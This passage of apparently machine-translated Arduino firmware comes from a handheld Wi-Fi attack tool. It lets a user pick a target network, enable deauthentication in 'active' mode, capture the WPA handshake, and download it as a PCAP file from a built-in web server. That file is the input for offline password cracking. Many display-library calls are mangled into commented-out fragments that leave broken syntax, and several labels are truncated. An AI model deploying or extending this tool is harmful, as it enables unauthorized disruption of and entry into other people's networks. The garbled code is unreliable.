    int titleCenterX = (//width() - titleWidth) / 2;
    if (titleCenterX < 0) titleCenterX = 0;
    //.setCursor(titleCenterX, 15);
    //.print(title);

    // ModeOptions
    for (int i = 0; i < 3; i++) {
      int y = 25 + i * 14; // AddSpacing
      //.setForegroundColor(SSD1306_WHITE);

      // Center - UsageUTF8Width
      int textWidth = //.getUTF8Width(modeNames[i]);
      int centerX = (//width() - textWidth) / 2;
      if (centerX < 0) centerX = 0;

      // YesMediumOptions，
      if (i == modeState) {
        //
        //.setCursor(centerX - 15, y + 8);
        //.print("-");

        //
        //.setCursor(centerX + textWidth + 5, y + 8);
        //.print(" -");
      }

      // Options
      //.setCursor(centerX, y + 8);
      //.print(modeNames[i]);
    }


    ////);

    //  - Usage
    static unsigned long lastKeyTime = 0;
    static bool keyPressed = false;

    if (digitalRead(BTN_UP) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        if (modeState > 0) modeState--;
      }
    } else if (digitalRead(BTN_DOWN) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        if (modeState < 2) modeState++;
      }
    } else if (digitalRead(BTN_OK) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        quick_capture_mode = modeState;
        startQuickCapture();
        return;
      }
    } else if (digitalRead(BTN_BACK) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        return;
      }
    } else {
      keyPressed = false;
    }

    delay(20); // Delay
  }
}

// StartPacket
void startQuickCapture() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
    return;
  }

  // SettingsTargetNetwork
  int selectedIndex = SelectedVector[0];
  WiFiScanResult selected = scan_results[selectedIndex];
  memcpy(_selectedNetwork.bssid, selected.bssid, 6);
  _selectedNetwork.ssid = selected.ssid;
  _selectedNetwork.ch = selected.channel;
  AP_Channel = String(selected.channel);

  // ConfigPacketMode
  if (quick_capture_mode == 1) { // Mode
    g_captureMode = CAPTURE_MODE_PASSIVE;
    g_captureDeauthEnabled = false;
    Serial.println("[QuickCapture] Mode: PASSIVE");
  } else if (quick_capture_mode == 2) { // HeightMode
    g_captureMode = CAPTURE_MODE_EFFICIENT;
    g_captureDeauthEnabled = false;
    Serial.println("[QuickCapture] Mode: EFFICIENT");
  } else { // Mode
    g_captureMode = CAPTURE_MODE_ACTIVE;
    g_captureDeauthEnabled = true;
    Serial.println("[QuickCapture] Mode: ACTIVE");
  }

  Serial.print("[QuickCapture] Target: ");
  Serial.print(_selectedNetwork.ssid);
  Serial.print(" (");
  Serial.print(macToString(_selectedNetwork.bssid, 6));
  Serial.print(") CH");
  Serial.println(_selectedNetwork.ch);

  // PacketStatus
  isHandshakeCaptured = false;
  handshakeDataAvailable = false;
  resetCaptureData();
  resetGlobalHandshakeData();

  // StartPacket
  quick_capture_active = true;
  quick_capture_completed = false;
  quick_capture_start_time = millis();
  readyToSniff = true;
  hs_sniffer_running = true;

  // StartInfo
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  //.setCursor(5, 30);
  //.print("StartPacket...");
  ////);
  delay(1000);
}

// PacketProgress（）
void displayQuickCaptureProgress() {
  static unsigned long lastUpdate = 0;
  unsigned long currentTime = millis();

  // 500msUpdate
  if (currentTime - lastUpdate > 500) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Title
    //.setCursor(5, 15);
    //.print("PacketMedium...");

    // TargetNetworkInfo
    //.setCursor(5, 25);
    //.print("Target: ");
    String ssidDisplay = _selectedNetwork.ssid.length() > 8 ? _selectedNetwork.ssid.substring(0, 8) + "..." : _selectedNetwork.ssid;
    //.print(ssidDisplay);

    // PacketStats
    //.setCursor(5, 35);
    //.print("Frame: ");
    //.print(capturedHandshake.frameCount);
    //.print("/4");

    //.setCursor(5, 45);
    //.print("ManageFrame: ");
    //.print(capturedManagement.frameCount);
    //.print("/10");

    // RunTime
    //.setCursor(5, 55);
    //.print("Time: ");
    //.print((currentTime - quick_capture_start_time) / 1000);
    //.print("s");

    ////);
    lastUpdate = currentTime;
  }
}

// PacketDone
void drawQuickCaptureComplete() {
  int menuState = 0; // 0=StartWebService, 1=BackMain Menu

  while (true) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Title
    //.setCursor(5, 15);
    //.print("PacketDone!");

    // StatsInfo
    //.setCursor(5, 25);
    //.print("Frame: ");
    //.print(capturedHandshake.frameCount);
    //.print("/4");

    //.setCursor(5, 35);
    //.print("ManageFrame: ");
    //.print(capturedManagement.frameCount);
    //.print("/10");

    //.setCursor(5, 45);
    //.print(": ");
    //.print((quick_capture_end_time - quick_capture_start_time) / 1000);
    //.print("s");

    // MenuOptions
    const char* menuItems[] = {"StartWebService", "BackMain Menu"};
    for (int i = 0; i < 2; i++) {
      int y = 55 + i * 12;
      if (i == menuState) {
        //fillRoundRect(0, y-2, 128, 12, 2, SSD1306_WHITE);
        //.setForegroundColor(SSD1306_BLACK);
      } else {
        //.setForegroundColor(SSD1306_WHITE);
      }
      //.setCursor(5, y + 8);
      //.print(menuItems[i]);
    }

    ////);

    //
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (menuState > 0) menuState--;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (menuState < 1) menuState++;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      if (menuState == 0) {
        // StartWebService
        startWebServiceForCapture();
        // WebServiceInfo
        drawWebServiceInfo();
        return;
      } else {
        // BackMain Menu
        return;
      }
    }
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return;
    }
    delay(50);
  }
}

// PacketTimeout
void drawQuickCaptureTimeout() {
  while (true) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    //.setCursor(5, 20);
    //.print("PacketTimeout");

    //.setCursor(5, 35);
    //.print("Handshake");

    //.setCursor(5, 50);
    //.print("《 BackMain Menu");

    ////);

    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return;
    }
    delay(50);
  }
}

// StartWebServicePacketDownload
void startWebServiceForCapture() {
  Serial.println("=== StartPacketWebService ===");

  // CleanService
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();

  // WaitNetworkDisconnect
  delay(2000);

  // StartAPMode
  Serial.println("StartPacketWebServiceAPMode...");
  char channel_str[4];
  sprintf(channel_str, "%d", WEB_UI_CHANNEL);

  // Retry
  int retryCount = 0;
  bool apStarted = false;
  while (retryCount < 3 && !apStarted) {
    if (WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
      apStarted = true;
      Serial.println("PacketWebServiceAPModeStartSuccess");
    } else {
      retryCount++;
      Serial.print("PacketWebServiceAPModeStartFailed，Retry ");
      Serial.print(retryCount);
      Serial.println("/3");
      delay(1000);
    }
  }

  if (apStarted) {
    Serial.println("SSID: " + String(WEB_UI_SSID));
    Serial.println("Password: " + String(WEB_UI_PASSWORD));
    Serial.println("Channel: " + String(WEB_UI_CHANNEL));

    // WaitAPStart
    delay(2000);

    IPAddress apIp = WiFi.localIP();
    Serial.print("IP: ");
    Serial.println(apIp);

    // StartWebService
    startWebUIServices(apIp);

    Serial.println("PacketWebServiceStartDone");
  } else {
    Serial.println("PacketWebServiceAPModeStartFailed，Retry3");
  }
}

// SendPacketDone
void sendQuickCapturePage(WiFiClient& client) {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>PacketDone</title>";
  html += "<style>";
  html += "body{font-family:Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5;}";
  html += ".container{max-width:600px;margin:0 auto;background:white;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
  html += "h1{color:#333;text-align:center;margin-bottom:30px;}";
  html += ".status{background:#e8f5e8;border:1px solid #4caf50;padding:15px;border-radius:5px;margin:20px 0;}";
  html += ".info{background:#f0f8ff;border:1px solid #2196f3;padding:15px;border-radius:5px;margin:20px 0;}";
  html += ".btn{display:inline-block;padding:12px 24px;background:#4caf50;color:white;text-decoration:none;border-radius:5px;margin:10px 5px;text-align:center;}";
  html += ".btn:hover{background:#45a049;}";
  html += ".btn-danger{background:#f44336;}";
  html += ".btn-danger:hover{background:#da190b;}";
  html += ".stats{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:20px 0;}";
  html += ".stat-item{background:#f9f9f9;padding:15px;border-radius:5px;text-align:center;}";
  html += ".stat-value{font-size:24px;font-weight:bold;color:#2196f3;}";
  html += ".stat-label{color:#666;margin-top:5px;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<h1>🔐 PacketDone</h1>";

  // PacketStatsInfo
  html += "<div class='status'>";
  html += "<h3>PacketStats</h3>";
  html += "<div class='stats'>";
  html += "<div class='stat-item'><div class='stat-value'>" + String(capturedHandshake.frameCount) + "/4</div><div class='stat-label'>Frame</div></div>";
  html += "<div class='stat-item'><div class='stat-value'>" + String(capturedManagement.frameCount) + "/10</div><div class='stat-label'>ManageFrame</div></div>";
  html += "<div class='stat-item'><div class='stat-value'>" + String((quick_capture_end_time - quick_capture_start_time) / 1000) + "s</div><div class='stat-label'>Time</div></div>";
  html += "<div class='stat-item'><div class='stat-value'>" + String(globalPcapData.size()) + "B</div><div class='stat-label'>FileSize</div></div>";
  html += "</div></div>";

  // TargetNetworkInfo
  html += "<div class='info'>";
  html += "<h3>TargetNetworkInfo</h3>";
  html += "<p><strong>SSID:</strong> " + _selectedNetwork.ssid + "</p>";
  html += "<p><strong>BSSID:</strong> " + macToString(_selectedNetwork.bssid, 6) + "</p>";
  html += "<p><strong>Channel:</strong> " + String(_selectedNetwork.ch) + "</p>";
  html += "<p><strong>PacketMode:</strong> ";
  if (quick_capture_mode == 0) html += "Mode";
  else if (quick_capture_mode == 1) html += "Mode";
  else html += "HeightMode";
  html += "</p></div>";

  // Button
  html += "<div style='text-align:center;margin:30px 0;'>";
  html += "<a href='/capture/download' class='btn'>📥 DownloadPCAPFile</a>";
  html += "<a href='/' class='btn btn-danger'>🏠 Back</a>";
  html += "</div>";

  html += "<div style='text-align:center;color:#666;font-size:14px;'>";
  html += "<p>⚠️ Security，</p>";
  html += "</div></div></body></html>";

  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Content-Length: " + String(html.length()) + "\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  client.print(html);
}

// SendPCAPFileDownload
void sendPcapDownload(WiFiClient& client) {
  if (globalPcapData.empty()) {
    String hdr = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    return;
  }

  String hdr = "HTTP/1.1 200 OK\r\n";
  hdr += "Content-Type: application/octet-stream\r\n";
  hdr += "Content-Disposition: attachment; filename=\"handshake_" + _selectedNetwork.ssid + ".pcap\"\r\n";
  hdr += "Content-Length: " + String(globalPcapData.size()) + "\r\n";
  hdr += "Connection: close\r\n\r\n";
  client.print(hdr);
  client.write(globalPcapData.data(), globalPcapData.size());
}

// SendPacketStatusAPI
void sendCaptureStatus(WiFiClient& client) {
  String json = "{";
  json += "\"completed\":" + String(quick_capture_completed ? "true" : "false") + ",";
  json += "\"handshake_frames\":" + String(capturedHandshake.frameCount) + ",";
  json += "\"management_frames\":" + String(capturedManagement.frameCount) + ",";
  json += "\"capture_time\":" + String((quick_capture_end_time - quick_capture_start_time) / 1000) + ",";
  json += "\"file_size\":" + String(globalPcapData.size()) + ",";
  json += "\"target_ssid\":\"" + _selectedNetwork.ssid + "\",";
  json += "\"target_bssid\":\"" + macToString(_selectedNetwork.bssid, 6) + "\",";
  json += "\"target_channel\":" + String(_selectedNetwork.ch) + ",";
  json += "\"capture_mode\":" + String(quick_capture_mode);
  json += "}";

  String hdr = "HTTP/1.1 200 OK\r\n";
  hdr += "Content-Type: application/json\r\n";
  hdr += "Content-Length: " + String(json.length()) + "\r\n";
  hdr += "Connection: close\r\n\r\n";
  client.print(hdr);
  client.print(json);
}

// WebServiceInfo
void drawWebServiceInfo() {
  while (true) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Title
    //.setCursor(5, 18);
    //.print("Handshake");

    // ConnectInfo
    //.setCursor(5, 30);
    //.print("ResumeStartWebService");

    //.setCursor(5, 42);
    //.print("DownloadHandshake");

    //.setCursor(5, 54);
    //.print("《 Resume | Download");

    ////);

    //
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return;
    }
    delay(50);
  }
}

// WebServiceStatus
void displayWebServiceStatus() {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  // Title
  //.setCursor(5, 15);
  //.print("WebServiceStarted");

  // TargetNetworkInfo
  //.setCursor(5, 25);
  //.print("Target: ");
  String ssidDisplay = _selectedNetwork.ssid.length() > 8 ? _selectedNetwork.ssid.substring(0, 8) + "..." : _selectedNetwork.ssid;
  //.print(ssidDisplay);

  // PacketStats
  //.setCursor(5, 35);
  //.print("Frame: ");
  //.print(capturedHandshake.frameCount);
  //.print("/4");

  //.setCursor(5, 45);
  //.print("ManageFrame: ");
  //.print(capturedManagement.frameCount);
  //.print("/10");

  // Web
  //.setCursor(5, 55);
  //.print("Web: 192.168.1.1");

  ////);
}
